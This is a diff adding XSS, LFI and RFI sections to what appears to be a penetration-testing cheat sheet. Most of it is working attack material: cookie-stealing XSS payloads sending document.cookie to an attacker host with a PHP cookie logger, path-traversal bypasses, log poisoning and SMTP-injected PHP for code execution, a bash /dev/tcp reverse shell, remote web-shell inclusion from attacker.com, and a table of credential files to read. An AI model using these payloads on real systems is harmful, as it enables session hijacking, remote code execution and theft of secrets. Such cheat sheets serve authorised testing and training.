@@ -3528,3 +3528,345 @@ Example: "admin" → "Admin123"
 
 ## XSS
 
+# Common Characters to Find in Input Fields
+
+- `<` 
+- `>` 
+- `'` 
+- `"` 
+- `{` 
+- `}` 
+- `;`
+
+## Types of XSS Vulnerabilities
+
+### Stored (Persistent)
+- The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments).
+
+### Reflected (Non-Persistent)
+- Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).
+
+### DOM-Based
+- Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).
+
+- Examples of Stored
+> ```text
+> <script>alert("XSS")</script>
+> <script>alert(document.cookie)</script>
+> <script>alert(window.origin)</script>
+> ```
+
+- Example of Reflected
+> - Inject directly into the URL, most commonly, search pages as provided in the example
+> ```text
+> http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+> ```
+
+- Example of Blind
+> -A good way to test this is to see if we can retrieve files externally using the JavaScript code, we can use the payloads from PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
+> ```text
+> <script src=http://[OUR_IP]></script>
+> '><script src=http://[OUR_IP]></script>
+> <script>$.getScript("http://[OUR_IP]")</script>
+> "><script src=http://[OUR_IP]></script>
+> javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+> <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+> ```
+
+- Privilege Escalation using session hijacking
+We need to make sure that the cookie is stored in the browser, we also need to consider that cookies can have two flags:
+
+    Secure: only sends the cookie over an encrypted connection like HTTPS.
+    HttpOnly: denies Javascript access to cookie; so we need that this options de disabled, you can check this in the Developer Tools of the browser.
+
+After verifying that the cookie could be steal by its flags and having a valid XSS field we can use one of the following payloads:
+Option 1
+
+# Possible Payloads
+> ```text
+> document.location='http://OUR_IP/index.php?c='+document.cookie;
+> or
+> new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+> ```
+
+# Access the Host
+> ```text
+> <script src=http://OUR_IP>/script.js</script>
+> ```
+
+Option2
+# Payload
+> ```text
+> <img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>
+> ```
+# PHP Server Code
+> ```php
+> <?php
+> if (isset($_GET['c'])) {
+>     $list = explode(";", $_GET['c']);
+>     foreach ($list as $key => $value) {
+>         $cookie = urldecode($value);
+>         $file = fopen("cookies.txt", "a+");
+>         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+>         fclose($file);
+>     }
+> }
+> ?>
+> ```
+
+---
+
+## LFI
+
+- Basic example of an lfi
+> ```text
+> http://<target_url>/file.php?recurse=<file_name>
+> ```
+
+- URL encoding bypass
+> ```text
+>  http://<target_url>/file.php?recurse=../../../../../etc/passwd% 
+> ```
+
+- Null byte injection bypass
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte
+> ```
+
+- Avoiding ..
+> ```text
+> http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
+> http://<target_url>/file.php?recurse=.*/.*/.*/.*/.*/etc/passwd
+> http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
+> ```
+
+- Double URL encoding
+> ```text
+> http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd
+> ```
+
+- Repeated slashes bypass
+> ```text
+> http://<target_url>/file.php?recurse=....//....//....//etc/passwd
+> ```
+
+- Viewing a file with null byte injection
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../etc/passwd%00
+> ```
+
+- Bypass file extension restrictions
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg
+> ```
+
+- Retrieve system environment variables
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+> ```
+
+- Base64
+> ```text
+> http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
+> ```
+
+- Decode base64-encoded output
+> ```bash
+> echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
+> ```
+ 
+- ROT13
+> ```text
+> http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
+> ```
+
+- PHP
+> ```bash
+> curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
+> ```
+
+### Log Poisoning (Apache or SSH Logs)
+If log files such as /var/log/apache2/access.log or /var/log/auth.log are accessible through LFI, you can inject malicious code into the logs to achieve RCE.
+
+- 1. Verify if log files can be accessed via LFI:
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
+> ```
+
+- 2. Inject a malicious PHP payload into the logs via SSH:
+> ```bash
+> ssh "<?php system('whoami'); ?>"@<target>
+> ```
+
+- 3. Access the log file via LFI to execute the payload:
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
+> ```
+
+### Mail PHP Execution (RCE via Email)
+Using LFI, after enumerating users (e.g., /etc/passwd), you can attempt to execute PHP code through a mail server by embedding PHP in email data.
+
+- 1. Connect to the mail server:
+> ```bash
+> telnet <target_ip> 25
+> ```
+- 2. Inject PHP payload into the email service:
+> ```php
+> HELO localhost
+> MAIL FROM:<root>
+> RCPT TO:<www-data>
+> DATA
+> <?php echo shell_exec($_REQUEST['cmd']); ?>
+> .
+> ```
+- **If unsure about the users on the system, perform user enumeration:**
+> ```bash
+> smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
+> ```
+
+### Reverse Shell via LFI
+You can use /proc/self/environ to inject a shell. If the environment variables are writable, inject PHP code into the environment.
+
+- 1. Send the PHP payload:
+> ```bash
+> curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+> ```
+
+- 2. Access the file via LFI to trigger the reverse shell:
+> ```text
+> http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+> ```
+
+## RFI
+
+**Testing for RFI**
+
+> # Step 1: Setup web server with malicious file
+> # shell.txt content: <?php system($_GET['cmd']); ?>
+> python3 -m http.server 8000
+>
+> # Step 2: Test RFI with your server
+> page=http://your-server.com:8000/shell.txt
+>
+> # Step 3: Test different protocols
+> page=http://attacker.com/shell.txt
+> page=https://attacker.com/shell.txt
+> page=ftp://attacker.com/shell.txt
+> page=//attacker.com/shell.txt
+>
+> # Step 4: Execute commands if successful
+> page=http://attacker.com/shell.txt&cmd=whoami
+
+## Files and Paths for RFI and LFI
+
+**For Linux**
+
+| File Path                                  | Description                          |
+|--------------------------------------------|--------------------------------------|
+| /etc/apache2/apache2.conf                  | Apache config                        |
+| /etc/apache2/sites-available/000-default.conf | Apache virtual host configuration   |
+| /etc/group                                 | User groups                          |
+| /etc/hosts                                 | DNS mappings                         |
+| /etc/mysql/my.cnf                          | MySQL configuration                  |
+| /etc/nginx/nginx.conf                      | Nginx config                         |
+| /etc/passwd                                | Contains user accounts               |
+| /etc/resolv.conf                           | DNS configuration                    |
+| /etc/shadow                                | Stores hashed user passwords         |
+| /etc/ssh/sshd_config                       | SSH configuration                    |
+| /home/<user>/.bash_history                 | Command history                      |
+| /home/<user>/.ssh/id_rsa                   | SSH private key                      |
+| /proc/[PID]/cmdline                        | Other process command line           |
+| /proc/[PID]/environ                        | Other process environment            |
+| /proc/[PID]/fd/[0-9]*                      | Other process file descriptors       |
+| /proc/devices                              | Device drivers                       |
+| /proc/net/arp                              | ARP table                            |
+| /proc/net/fib_trie                         | Routing table                        |
+| /proc/net/tcp                              | TCP connections                      |
+| /proc/net/udp                              | UDP connections                      |
+| /proc/self/cmdline                         | Command line of current process      |
+| /proc/self/environ                         | Environment variables (can contain session tokens) |
+| /proc/self/exe                             | Executed binary                      |
+| /proc/self/fd/[0-9]*                       | File descriptors                     |
+| /proc/self/cwd                             | Current working directory            |
+| /proc/self/stat                            | Process statistics                   |
+| /proc/self/status                          | Process status                       |
+| /proc/version                              | Kernel version                       |
+| /root/.aws/credentials                     | AWS credentials                      |
+| /root/.docker/config.json                  | Docker credentials                   |
+| /usr/local/apache/logs/access_log          | Apache access logs                   |
+| /var/log/apache/access_log                 | Apache access logs                   |
+| /var/www/html/config.php                   | PHP config                           |
+| /var/www/html/.env                         | Environment variables                |
+| /var/www/html/.git/config                  | Git configuration                    |
+| /var/www/html/wp-config.php                | WordPress configuration              |
+| /var/www/logs/access_log                   | Web server access logs               |
+| /var/www/logs/access.log                   | Web server access logs               |
+
+**For Windows**
+
+| File Path                                                    | Description                          |
+|--------------------------------------------------------------|--------------------------------------|
+| C:\Apache\conf\httpd.conf                                     | Apache config                        |
+| C:\Apache\logs\access.log                                     | Apache access logs                   |
+| C:\Apache\logs\error.log                                      | Apache error logs                    |
+| C:\Apache2\conf\httpd.conf                                    | Apache2 config                       |
+| C:\Apache2\logs\access.log                                    | Apache2 access logs                  |
+| C:\Apache2\logs\error.log                                     | Apache2 error logs                   |
+| C:\Apache22\conf\httpd.conf                                   | Apache22 config                      |
+| C:\Apache22\logs\access.log                                   | Apache22 access logs                 |
+| C:\Apache22\logs\error.log                                    | Apache22 error logs                  |
+| C:\Apache24\conf\httpd.conf                                   | Apache24 config                      |
+| C:\Apache24\logs\access.log                                   | Apache24 access logs                 |
+| C:\Apache24\logs\error.log                                    | Apache24 error logs                  |
+| C:\Apache2\logs\error.log                                     | Apache2 error logs                   |
+| C:\Documents and Settings\Administrator\NTUser.dat            | Windows user data                    |
+| C:\php\php.ini                                                | PHP configuration file               |
+| C:\php4\php.ini                                               | PHP configuration file (version 4)   |
+| C:\php5\php.ini                                               | PHP configuration file (version 5)   |
+| C:\php7\php.ini                                               | PHP configuration file (version 7)   |
+| C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf    | Apache config                        |
+| C:\Program Files (x86)\Apache Group\Apache\logs\access.log    | Apache access logs                   |
+| C:\Program Files (x86)\Apache Group\Apache\logs\error.log     | Apache error logs                    |
+| C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf   | Apache2 config                       |
+| C:\Program Files (x86)\Apache Group\Apache2\logs\access.log   | Apache2 access logs                  |
+| C:\Program Files (x86)\Apache Group\Apache2\logs\error.log    | Apache2 error logs                   |
+| C:\Program Files\Apache Group\Apache\conf\httpd.conf          | Apache config                        |
+| C:\Program Files\Apache Group\Apache\logs\access.log          | Apache access logs                   |
+| C:\Program Files\Apache Group\Apache\logs\error.log           | Apache error logs                    |
+| C:\Program Files\Apache Group\Apache2\conf\httpd.conf         | Apache2 config                       |
+| C:\Program Files\Apache Group\Apache2\logs\access.log         | Apache2 access logs                  |
+| C:\Program Files\Apache Group\Apache2\logs\error.log          | Apache2 error logs                   |
+| C:\Program Files\FileZilla Server\FileZilla Server.xml       | FileZilla Server configuration       |
+| C:\Program Files\MySQL\my.cnf                                 | MySQL configuration                  |
+| C:\Program Files\MySQL\my.ini                                 | MySQL configuration                  |
+| C:\Program Files\MySQL\MySQL Server 5.0\my.cnf               | MySQL 5.0 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.0\my.ini               | MySQL 5.0 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.1\my.cnf               | MySQL 5.1 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.1\my.ini               | MySQL 5.1 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.5\my.cnf               | MySQL 5.5 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.5\my.ini               | MySQL 5.5 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.6\my.cnf               | MySQL 5.6 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.6\my.ini               | MySQL 5.6 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.7\my.cnf               | MySQL 5.7 configuration              |
+| C:\Program Files\MySQL\MySQL Server 5.7\my.ini               | MySQL 5.7 configuration              |
+| C:\Program Files\php\php.ini                                  | PHP configuration file               |
+| C:\Users\Administrator\NTUser.dat                             | Windows user data                    |
+| C:\Windows\System32\drivers\etc\hosts                         | Hosts file                           |
+| C:\Windows\System32\winevt\Logs\Application.evtx              | Application event logs               |
+| C:\Windows\System32\winevt\Logs\Security.evtx                 | Security event logs                  |
+| C:\Windows\System32\winevt\Logs\System.evtx                   | System event logs                    |
+| C:\Windows\win.ini                                            | Windows initialization file          |
+| C:\xampp\apache\conf\extra\httpd-xampp.conf                  | XAMPP Apache configuration           |
+| C:\xampp\apache\conf\httpd.conf                               | XAMPP Apache configuration           |
+| C:\xampp\apache\logs\access.log                               | XAMPP Apache access logs             |
+| C:\xampp\apache\logs\error.log                                | XAMPP Apache error logs              |
+| C:\xampp\FileZillaFTP\FileZilla Server.xml                   | XAMPP FileZilla configuration        |
+| C:\xampp\MercuryMail\MERCURY.INI                             | XAMPP Mercury Mail configuration     |
+| C:\xampp\mysql\bin\my.ini                                     | XAMPP MySQL configuration            |
+| C:\xampp\php\php.ini                                          | XAMPP PHP configuration              |
+| C:\xampp\security\webdav.htpasswd                            | XAMPP WebDav password file           |
+| C:\xampp\sendmail\sendmail.ini                                | XAMPP sendmail configuration         |
+| C:\xampp\tomcat\conf\server.xml                              | XAMPP Tomcat configuration           |
+
+---
+
